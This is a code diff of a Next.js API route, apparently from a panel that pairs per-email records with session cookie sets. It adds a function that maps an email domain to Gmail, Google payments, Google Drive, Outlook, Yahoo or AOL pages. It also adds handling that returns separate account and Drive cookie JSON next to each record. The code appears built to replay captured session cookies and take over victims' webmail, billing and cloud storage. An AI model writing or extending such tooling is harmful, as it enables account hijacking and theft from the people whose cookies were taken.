@@ -7,16 +7,64 @@ export const dynamic = 'force-dynamic';
 
 const MAIN_API = process.env.MAIN_API_URL || 'https://webfixx-hoo-oamupo-e98ced-157-173-204-24.sslip.io/api';
 
-const PLATFORM_INBOX_URLS = {
-  'outlook.com': 'https://outlook.live.com/mail/',
-  'hotmail.com': 'https://outlook.live.com/mail/',
-  'live.com': 'https://outlook.live.com/mail/',
-  'msn.com': 'https://outlook.live.com/mail/',
-  'gmail.com': 'https://mail.google.com/mail/',
-  'googlemail.com': 'https://mail.google.com/mail/',
-  'yahoo.com': 'https://mail.yahoo.com/',
-  'aol.com': 'https://mail.aol.com/',
-};
+
+const FREE_MS_DOMAINS = new Set([
+    'outlook.com', 'hotmail.com', 'live.com', 'windowslive.com',
+    'outlook.co.uk', 'hotmail.co.uk', 'live.co.uk',
+    'outlook.ca', 'hotmail.ca', 'live.ca',
+    'outlook.co.za', 'hotmail.co.za', 'live.co.za',
+    'outlook.com.au', 'hotmail.com.au', 'live.com.au',
+    'outlook.fr', 'hotmail.fr', 'live.fr',
+    'outlook.de', 'hotmail.de', 'live.de',
+    'outlook.it', 'hotmail.it', 'live.it',
+    'outlook.es', 'hotmail.es', 'live.es',
+    'outlook.jp', 'hotmail.jp', 'live.jp',
+    'outlook.com.br', 'hotmail.com.br', 'live.com.br',
+    'msn.com', 'live.net'
+]);
+
+function resolveSmartPlatformUrls(domain, platform, email) {
+    const d = (domain || (email ? email.split('@')[1] : '') || '').toLowerCase().trim();
+    const p = (platform || '').toLowerCase().trim();
+    const em = (email || '').toLowerCase().trim();
+
+    // 1. Google / Gmail: 3 tabs
+    if (p === 'google' || p === 'gmail' || d.includes('google') || d.includes('gmail') || em.endsWith('@gmail.com') || em.endsWith('@googlemail.com')) {
+        return [
+            'https://mail.google.com/mail/u/0/#inbox',
+            'https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app',
+            'https://drive.google.com/drive/u/0/home'
+        ];
+    }
+
+    // 2. Outlook / Microsoft / Office 365: 1 tab dynamically resolved
+    const isMsDomain = FREE_MS_DOMAINS.has(d) || d.includes('outlook') || d.includes('hotmail') || d.includes('live') || d.includes('msn') || d.includes('microsoft');
+    if (p === 'outlook' || p === 'microsoft' || p === 'office365' || isMsDomain) {
+        if (FREE_MS_DOMAINS.has(d) || d.includes('outlook') || d.includes('hotmail') || d.includes('live') || d.includes('msn')) {
+            return ['https://outlook.live.com/mail/'];
+        }
+        // Custom domain / Office 365 / corporate paid account
+        return ['https://outlook.office.com/mail/'];
+    }
+
+    // 3. Yahoo
+    if (p === 'yahoo' || d.includes('yahoo') || d.includes('ymail')) {
+        return ['https://mail.yahoo.com/'];
+    }
+
+    // 4. AOL
+    if (p === 'aol' || d.includes('aol')) {
+        return ['https://mail.aol.com/'];
+    }
+
+    // 5. Fallback for custom domain
+    if (d) {
+        return [`https://${d}`];
+    }
+
+    return ['https://mail.google.com/mail/u/0/#inbox'];
+}
+
 
 const getDirectDownloadUrl = (driveUrl) => {
   if (!driveUrl) return null;
@@ -116,14 +164,39 @@ export async function POST(request) {
       }
     } catch (_) {}
 
+    const platform = col('platform') || '';
+    const accountCookieJSONRaw = col('accountCookieJSON') || '';
+    const driveCookieJSONRaw = col('driveCookieJSON') || '';
+    let accountCookieJSON = [];
+    if (accountCookieJSONRaw) {
+      try {
+        accountCookieJSON = typeof accountCookieJSONRaw === 'string' ? JSON.parse(accountCookieJSONRaw) : accountCookieJSONRaw;
+        if (!Array.isArray(accountCookieJSON)) accountCookieJSON = [];
+      } catch (_) { accountCookieJSON = []; }
+    }
+    let driveCookieJSON = [];
+    if (driveCookieJSONRaw) {
+      try {
+        driveCookieJSON = typeof driveCookieJSONRaw === 'string' ? JSON.parse(driveCookieJSONRaw) : driveCookieJSONRaw;
+        if (!Array.isArray(driveCookieJSON)) driveCookieJSON = [];
+      } catch (_) { driveCookieJSON = []; }
+    }
+
+    const platformUrls = resolveSmartPlatformUrls(domain, platform, email);
+    const platformUrl = platformUrls[0] || 'https://mail.google.com/mail/u/0/#inbox';
+
     return NextResponse.json({
       downloadUrl: getDirectDownloadUrl(driveUrl),
       driveUrl,
       domain: domain || '',
       email: col('email') || '',
       category: col('category') || '',
-      platformUrl: domain ? (PLATFORM_INBOX_URLS[domain] || `https://${domain}`) : '',
+      platform,
+      platformUrl,
+      platformUrls,
       cookieJSON,
+      accountCookieJSON,
+      driveCookieJSON,
     });
   } catch (error) {
     return NextResponse.json({ error: error.message }, { status: 500 });
